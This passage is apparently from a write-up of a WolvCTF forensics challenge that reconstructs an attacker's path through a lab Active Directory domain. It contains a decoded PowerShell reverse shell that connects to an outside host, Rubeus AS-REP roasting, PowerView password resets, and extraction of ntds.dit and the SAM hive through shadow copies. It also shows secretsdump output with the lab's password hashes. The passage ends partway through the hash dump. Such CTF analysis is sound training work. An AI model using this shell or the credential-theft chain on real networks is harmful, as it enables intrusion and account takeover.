install.</span><br><span class="line">2025-03-18 21:14:25.14 spid5s      SQL Server is terminating <span class="keyword">in</span> response to a <span class="string">&#x27;stop&#x27;</span> request from Service Control Manager. This is an informational message only. No user action is required.</span><br><span class="line">2025-03-18 21:14:26.61 spid13s     Service Broker manager has shut down.</span><br><span class="line">2025-03-18 21:14:26.65 spid5s      .NET Framework runtime has been stopped.</span><br><span class="line">2025-03-18 21:14:27.51 spid5s      SQL Server shutdown has been initiated</span><br><span class="line">2025-03-18 21:14:27.53 spid5s      SQL Trace was stopped due to server shutdown. Trace ID = <span class="string">&#x27;1&#x27;</span>. This is an informational message only; no user action is required.</span><br></pre></td></tr></table></figure>

<p>Flag 1.1: </p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">wctf&#123;d0nt_3n4bl3_</span></span><br></pre></td></tr></table></figure>

<h5 id="Getting-powershell-access"><a href="#Getting-powershell-access" class="headerlink" title="Getting powershell access"></a>Getting powershell access</h5><p>Again in the WinPEAS output we can find the following process execution signalling xp_cmdshell execution on MSSQL server</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell(8532)</span><br><span class="line">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe] -- POwn: MSSQL<span class="variable">$SQLEXPRESS</span></span><br><span class="line">    Command Line: powershell  -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAOAA3AC4AMQAyADgAIgAsADEANAAzADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAZQBuAGMAbwBkAGUAZABfAGYAbABhAGcAcAB0ADIAIAA9ACAAIgBYADMAaABRAFgAMgBOAHQAWgBIAE4AbwBNAHoARQB4AFgAMwBjAHgAZABHAGgAZgBaAEQATgBtAFkAWABWAHMAZABGADkAagBjAGoATgBrAGMAMQA4AHcAYwBsADgAPQBzACIAOwAkAGYAbABhAGcAcAB0ADIAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAZQBuAGMAbwBkAGUAZABfAGYAbABhAGcAcAB0ADIAKQApADsAVwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAkAGYAbABhAGcAcAB0ADIAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==</span><br></pre></td></tr></table></figure>

<p>Decoding this Base64 encoded cmd gives us</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$client</span> = New-Object System.Net.Sockets.TCPClient(<span class="string">&quot;192.168.187.128&quot;</span>,1433);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + <span class="string">&quot;PS &quot;</span> + (<span class="built_in">pwd</span>).Path + <span class="string">&quot;&gt; &quot;</span>;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$encoded_flagpt2</span> = <span class="string">&quot;X3hQX2NtZHNoMzExX3cxdGhfZDNmYXVsdF9jcjNkc18wcl8=s&quot;</span>;<span class="variable">$flagpt2</span> = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(<span class="variable">$encoded_flagpt2</span>));Write-Output <span class="variable">$flagpt2</span>;<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span><br></pre></td></tr></table></figure>
<p>This creates a TCP connection and gives a reverse shell to the attacker with full powershell access and it also gives us the second part of our first flag.</p>
<p>Flag 1.2: </p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">_xP_cmdsh311_w1th_d3fault_cr3ds_0r_</span></span><br></pre></td></tr></table></figure>

<h5 id="Getting-Autologon-Credentials"><a href="#Getting-Autologon-Credentials" class="headerlink" title="Getting Autologon Credentials"></a>Getting Autologon Credentials</h5><p>Next again we find in the WinPEAS output that it enumerated and successfully gave the credentials of the user <code>dan</code> thus giving the attacker an entry point to the domain.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Looking <span class="keyword">for</span> AutoLogon credentials</span><br><span class="line">Some AutoLogon credentials were found</span><br><span class="line">    DefaultDomainName             :  WOLVCTF</span><br><span class="line">    DefaultUserName               :  WOLVCTF\Dan</span><br><span class="line">    DefaultPassword               :  DansSuperCoolPassw0rd!!</span><br><span class="line">    AltDefaultUserName            :  loot-in-hex:656e61626c335f347574306c6f67306e5f306b3f3f213f7d</span><br></pre></td></tr></table></figure>

<p>And the loot-in-hex field gives us our third part of first flag.</p>
<p>Flag 1.3: </p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">enabl3_4ut0log0n_0k??!?&#125;</span></span><br></pre></td></tr></table></figure>

<h5 id="Escalation-dan-to-emily"><a href="#Escalation-dan-to-emily" class="headerlink" title="Escalation dan to emily"></a>Escalation dan to emily</h5><p>We find the <code>ConsoleHost_History.txt</code> for dan at the location <code>./Users/dan/AppData/Roaming/Microsoft/Windows/Powershell/PSReadLine</code> which gives following commands history when the attacker was as dan.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> Desktop</span><br><span class="line">Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\dan\Documents -OutputPrefix <span class="string">&quot;wolvctf_audit&quot;</span></span><br><span class="line">powershell -ep bypass</span><br><span class="line">.\SharpHound.ps1</span><br><span class="line">Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\dan\Documents -OutputPrefix <span class="string">&quot;wolvctf_audit&quot;</span></span><br><span class="line">Import-Module \SharpHound.ps1</span><br><span class="line">Import-Module .\SharpHound.ps1</span><br><span class="line">Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\dan\Documents -OutputPrefix <span class="string">&quot;wolvctf_audit&quot;</span></span><br><span class="line">.\Rubeus.exe asreproast /user:emily /domain:wolvctf.corp /dc:DC01.wolvctf.corp &gt; asreproast.output</span><br><span class="line"> .\Rubeus.exe kerberoast &gt; kerberoast.output</span><br><span class="line">runas /User:wolvctf\emily cmd`</span><br></pre></td></tr></table></figure>

<p>This suggests that the user tried to perform the AS-REP Roasting attack on Kerberos Authentication using Rubeus to get the password for emily. So we find the <code>asreproast.output</code> at the location <code>./Users/dan/Desktop</code> with following output.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">   ______        _                      </span><br><span class="line">  (_____ \      | |                     </span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___ </span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.2.0 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: AS-REP roasting</span><br><span class="line"></span><br><span class="line">[*] Target User            : emily</span><br><span class="line">[*] Target Domain          : wolvctf.corp</span><br><span class="line">[*] Target DC              : DC01.wolvctf.corp</span><br><span class="line"></span><br><span class="line">[*] Using domain controller: DC01.wolvctf.corp (fe80::af8f:bc46:1257:36be%5)</span><br><span class="line">[*] Building AS-REQ (w/o preauth) <span class="keyword">for</span>: <span class="string">&#x27;wolvctf.corp\emily&#x27;</span></span><br><span class="line">[+] AS-REQ w/o preauth successful!</span><br><span class="line">[*] AS-REP <span class="built_in">hash</span>:</span><br><span class="line"></span><br><span class="line">      $krb5asrep<span class="variable">$emily</span>@wolvctf.corp:34C3460101DA5A3081FA4F6518A0ECE1<span class="variable">$619944A029EF908C7</span></span><br><span class="line">      8A80E2559C06788E2D86AEB1C94CD97E4540E5EA57C550C7FBD768D6EA24DBC66CFC6B8A9E39C364</span><br><span class="line">      39CA4B50DCF29F3C078785F876835B239B3628F561D080F83294C9A3BC8D1C4DEC538A15339257DC</span><br><span class="line">      AAB20F33EE168BDEA0671C4AB92DA6B089D7700E7BE42564706BFA903654EDF11376C1994BBE6B9C</span><br><span class="line">      C65E53275EF3148B638AA5A52284E29912C3CA2171FD50FBD6929511416B51F8C4F8CB9383DA74E8</span><br><span class="line">      DB3B0493A2654093C44BC399695525DD90E271A90C9992024A1D05E4188EC588663D2D849142AED6</span><br><span class="line">      5C5B77C38ED3DC7BB65178A565248F199B5DC2D382D2DA016DAD023</span><br><span class="line"></span><br><span class="line">[*_*] d2N0Znthc3IzcHIwNHN0M2Q/Xw==</span><br></pre></td></tr></table></figure>

<p>Now the base64 comment at the end gives us the first part of our second flag and on cracking this krb5asrep hash for emily using <code>John the Ripper</code> we can find the password for emily as <code>youdontknowmypasswordhaha</code>.</p>
<p>Flag 2.1: </p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">wctf&#123;asr3pr04st3d?_</span></span><br></pre></td></tr></table></figure>

<h5 id="Escalation-emily-to-james"><a href="#Escalation-emily-to-james" class="headerlink" title="Escalation emily to james"></a>Escalation emily to james</h5><p>Again the Console History of emily reveals the following info.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\Users\emily</span><br><span class="line">tree /f /a &gt; tree.txt</span><br><span class="line"><span class="built_in">type</span> tree.txt</span><br><span class="line"><span class="built_in">cd</span> Documents</span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"><span class="built_in">type</span> README</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;James asked me to keep his password secret, so I made sure to take extra precautions.&quot;</span> &gt;&gt; C:\Users\Public\loot.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Note to self: Password for the zip is same as mine, with 777 at the end&quot;</span> &gt;&gt; C:\Users\Public\loot.txt</span><br><span class="line">del README</span><br><span class="line"><span class="built_in">cp</span> .\important.7z C:\Users\Public</span><br><span class="line">del C:\Users\Public\loot.txt</span><br><span class="line">del C:\Users\Public\important.7z</span><br><span class="line">runas /User:wolvctf\james cmd</span><br></pre></td></tr></table></figure>

<p>Which suggest the presence of importat.7z and since we know emily’s password we also know the password for the zip so we quicly extract the zip with the password <code>youdontknowmypasswordhaha777</code> to find 3 images in the zip car.jpeg, cat.jpg and cattttt.jpeg.</p>
<p><img src="/./images/imp_zip.png" alt="Image"></p>
<p>And on using binwalk on car.jpeg we get another image which bears the secodn part of flag 2 and also the password for james. Maybe the extra precaution that emily took hinted to this slight steganographic technique of byte scraping.</p>
<p><img src="/./images/car_bin.png" alt="Image"></p>
<p>Flag 2.2: </p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">sh0uldv3_3nabl3d_s0m3_k3b3r0s_pr34th_4nd_</span></span><br></pre></td></tr></table></figure>

<h5 id="Escalation-james-to-patrick"><a href="#Escalation-james-to-patrick" class="headerlink" title="Escalation james to patrick"></a>Escalation james to patrick</h5><p>Viewing the console history for james reveals the following password change attampt.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\Users\Public\Documents</span><br><span class="line"><span class="built_in">mv</span> .\PowerView.txt .\PowerView.ps1</span><br><span class="line">powershell -ep bypass</span><br><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line">Find-DomainProcess</span><br><span class="line"><span class="variable">$NewPassword</span> = ConvertTo-SecureString <span class="string">&#x27;Password123!&#x27;</span> -AsPlainText -Force`</span><br><span class="line">Set-DomainUserPassword -Identity <span class="string">&#x27;emily&#x27;</span> -AccountPassword <span class="variable">$NewPassword</span></span><br><span class="line"><span class="variable">$NewPassword</span> = ConvertTo-SecureString <span class="string">&#x27;d0nt_us3_4ll3xtendedr1ghts&#125;&#x27;</span> -AsPlainText -Force`</span><br><span class="line">Set-DomainUserPassword -Identity <span class="string">&#x27;patrick&#x27;</span> -AccountPassword <span class="variable">$NewPassword</span></span><br><span class="line">runas /User:wolvctf\patrick cmd</span><br></pre></td></tr></table></figure>

<p>Which shows that the attacker ran PowerView.ps1 a PowerShell script for Active Directory (AD) enumeration and abuse to search for processes running in the domain, helping identify privileged accounts. If the attacker has reset privileges, they forcefully set new passwords for domain users emily and patrick and then get access as patrick. This also gives us the third part of our second flag.</p>
<p>Flag 2.3: </p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">d0nt_us3_4ll3xtendedr1ghts&#125;</span></span><br></pre></td></tr></table></figure>

<h5 id="Escalation-patrick-to-jake"><a href="#Escalation-patrick-to-jake" class="headerlink" title="Escalation patrick to jake"></a>Escalation patrick to jake</h5><p>Pretty straight forward as the password for jake was present in a <code>note_from_jake.txt</code> in the Desktop directory of patrick.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">If you need anything backed up you can just use my account:</span><br><span class="line"></span><br><span class="line">Password: fwa3fe8#FEwef</span><br></pre></td></tr></table></figure>

<h5 id="Escalation-jake-to-jessica"><a href="#Escalation-jake-to-jessica" class="headerlink" title="Escalation jake to jessica"></a>Escalation jake to jessica</h5><p>The console history of jake looked like the follwong.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\Users\Public\Downloads</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">cd</span> C:\Users\jake\desktop</span><br><span class="line"><span class="built_in">whoami</span> /all &gt; whoami.txt</span><br><span class="line"><span class="built_in">type</span> .\whoami.txt</span><br><span class="line"><span class="built_in">cd</span> C:\Users\public</span><br><span class="line"><span class="built_in">cd</span> downloads</span><br><span class="line">diskshadow.exe /s script.txt</span><br><span class="line">diskshadow.exe /s script.txt &gt; shadow.txt</span><br><span class="line"><span class="built_in">type</span> .\shadow.txt</span><br><span class="line"><span class="built_in">cp</span> .\shadow.txt C:\Users\jake\desktop\shadow.txt</span><br><span class="line">del shadow.txt</span><br><span class="line">robocopy /b z:\windows\ntds . ntds.dit &gt; robo.txt</span><br><span class="line"><span class="built_in">type</span> .\robo.txt</span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line">del robo.txt</span><br><span class="line"><span class="built_in">cp</span> ntds.dit C:\Users\jake\downloads</span><br><span class="line">del ntds.dit</span><br><span class="line"><span class="built_in">cd</span> C:\Users\jake\downloads</span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line">reg save hklm\system c:\<span class="built_in">users</span>\jake\downloads\system.hive</span><br><span class="line">reg save hklm\sam C:\<span class="built_in">users</span>\jake\downloads\sam.hive</span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"><span class="built_in">cp</span> * C:\Users\public</span><br><span class="line">del C:\Users\public\ntds.dit</span><br><span class="line">del C:\Users\public\sam.hive</span><br><span class="line">del C:\Users\public\system.hive</span><br><span class="line">runas /User:wolvctf\jessica</span><br><span class="line">runas /User:wolvctf\jessica cmd</span><br></pre></td></tr></table></figure>

<p>Which suggests the attacker first ran <code>whoami /all</code> to get detailed user privileges and group memberships, useful for assessing permission levels and then ran a script.txt to like create a shadow copy of the drive, which allows access to locked files such as <code>ntds.dit</code>. Then he extract all ntds.dit, sam.hive and system.hive in order to exxtract jessica’s password and get her accesss.</p>
<p>One thing to note is that from the WinPEAS output we already know that Jessica is the domain admin so the last flag is nothing but jessica’s password.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Computer Name           :   DC01</span><br><span class="line">   User Name               :   jessica</span><br><span class="line">   User Id                 :   4107</span><br><span class="line">   Is Enabled              :   True</span><br><span class="line">   User Type               :   Administrator</span><br><span class="line">   Comment                 :   IT</span><br><span class="line">   Last Logon              :   3/18/2025 2:38:19 PM</span><br><span class="line">   Logons Count            :   1</span><br><span class="line">   Password Last Set       :   3/18/2025 2:34:06 PM</span><br></pre></td></tr></table></figure>

<p>Now NTDS.DIT (New Technology Directory Services Directory Information Tree) is the primary database file of Microsoft’s Active Directory Domain Services. Essentially, NTDS.DIT stores and organizes all the information related to objects in the domain, including users, groups, computers, and more. So on inspecting the ntds.dit we find the following piece of information.</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Members</span> <span class="string">who</span> <span class="string">are</span> <span class="string">part</span> <span class="string">of</span> <span class="string">this</span> <span class="string">group</span> <span class="string">have</span> <span class="string">passwords</span> <span class="string">w</span> <span class="string">then</span> <span class="string">a</span> <span class="string">c</span> <span class="string">then</span> <span class="string">a</span> <span class="string">t</span> <span class="string">and</span> <span class="string">an</span> <span class="string">f,</span> <span class="string">curly</span> <span class="string">bracket</span> <span class="string">left,</span> <span class="string">&#x27;bloodhound_is_cool_&#x27;</span> <span class="string">(but</span> <span class="string">all</span> <span class="string">the</span> <span class="string">&#x27;o&#x27;</span><span class="string">s</span> <span class="string">are</span> <span class="string">&#x27;0&#x27;</span><span class="string">s),</span> <span class="string">then</span> <span class="string">a</span> <span class="string">city</span> <span class="string">in</span> <span class="string">all</span> <span class="string">lowercase</span> <span class="string">appended</span> <span class="string">by</span> <span class="number">3</span> <span class="string">numbers</span> <span class="string">(secret</span> <span class="string">only</span> <span class="string">you</span> <span class="string">know),</span>  <span class="string">right</span> <span class="string">curly</span> <span class="string">bracket.</span></span><br></pre></td></tr></table></figure>

<p>So we immediatiely jump to get the hashes for the users using registry hives and Impacket.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">$ secretsdump.py -ntds ntds.dit -system system.hive LOCAL</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x32032d8f6ff9102e4202d192c152e02a</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Searching <span class="keyword">for</span> pekList, be patient</span><br><span class="line">[*] PEK <span class="comment"># 0 found and decrypted: a802330d6d1dca4a57a459990af5e50e</span></span><br><span class="line">[*] Reading and decrypting hashes from ntds.dit</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:1b921e44ea5dfd940c004044d4ef4cae:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DC01$:1000:aad3b435b51404eeaad3b435b51404ee:b60be13c1c27a48e5c5afc10792afeab:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7f27814ee1fea90dc7495b265207db9d:::</span><br><span class="line">mssql_service:2102:aad3b435b51404eeaad3b435b51404ee:6092ca0e60d24f30d848a5def59d4753:::</span><br><span class="line">wolvctf.corp\james:4101:aad3b435b51404eeaad3b435b51404ee:4c20abe87d36b9ad715fd5671545abb5:::</span><br><span class="line">wolvctf.corp\emily:4102:aad3b435b51404eeaad3b435b51404ee:5c7a26ae4c40018fa1660cc2f1d82269:::</span><br><span class="line">wolvctf.corp\john:4103:aad3b435b51404eeaad3b435b51404ee:d24c1456aefeab3eb911c8015b9f6ce4:::</span><br><span class="line">wolvctf.corp\patrick:4104:aad3b435b51404eeaad3b435b51404ee:0311f96ce47c5cc21529fcc8375f9c2e:::</span><br><span class="line">wolvctf.corp\katherine:4105:aad3b435b51404eeaad3b435b51404ee:89218e0b151209e9d4fa0768ea72c70d:::</span><br><span class="line">wolvctf.corp\Amy:4106:aad3b435b51404eeaad3b435b51404ee:4aa4474c2886f6a796bd75eebe5ebf01:::</span><br><span class="line">wolvctf.corp\jessica:4107:aad3b435b51404eeaad3b435b51404ee:8fcdcffba18f392df7aa291527290aff:::</span><br><span class="line">wolvctf.corp\frank:4108:aad3b435b51404eeaad3b435b51404ee:b0212745c59fcf54f06ea501cd409ff5:::</span><br><span class="line">wolvctf.corp\chris:4109:aad3b435b51404eeaad3b435b51404ee:253cfc1375d39308ab1bb935b44e2010:::</span><br><span class="line">wolvctf.corp\renee:4110:aad3b435b51404eeaad3b435b51404ee:9b5109ef6dbc8086ed36a90c20aa1d48:::</span><br><span class="line">wolvctf.corp\peter:4111:aad3b435b51404eeaad3b435b51404ee:4f3cde005948d4e4fb232c35014ccafb:::</span><br><span class="line">wolvctf.corp\dan:4112:aad3b435b51404eeaad3b435b51404ee:e9d959da74f5c7590a80d635b36705a6:::</span><br><span class="line">wolvctf.corp\jake:4113:aad3b435b51404eeaad3b435b51404ee:cc4f0a96d3c0ce71b664e314b14ecd7e:::</span><br><span class="line">[*] Kerberos keys from ntds.dit</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:6b130a0ae6ddfb1628acf2ad84147e1ee38015a076aad76b03af0c1da43815a2</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:9d47fe6fc6471fed5d102f32dfa71eed</span><br><span class="line">Administrator:des-cbc-md5:01a1b5c21f94341c</span><br><span class="line">DC01$:aes256-cts-hmac-sha1-96:79c96d12dd9cc6369096bd8dbfe181d921aeffd4aaa53fc0d0263c7a665ee4c3</span><br><span class="line">DC01$:aes128-cts-hmac-sha1-96:47991a6fe70596e2f252209a7619ca93</span><br><span class="line">DC01$:des-cbc-md5:f7d6a4c8026df26e</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:a570965739e477e5636b47289b0ebd351b89089f904ddf6ba676a95fc043caf6</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:d70b85a9394ab390cc7a7d3b294cf841</span><br><span class="line">krbtgt:des-cbc-md5:a720fbdfc429ce38</span><br><span class="line">mssql_service:aes256-cts-hmac-sha1-96:e3ae0982ea2ae94b4d989a89bbd966e593472e4653869b5188f0f0a175226bd0</span><br><span class="line">mssql_service:aes128-cts-hmac-sha1-96:80b0488a2d5c02a819e73f5184fd4609</span><br><span class="line">mssql_service:des-cbc-md5:13e51ff2c76802f8</span><br><span 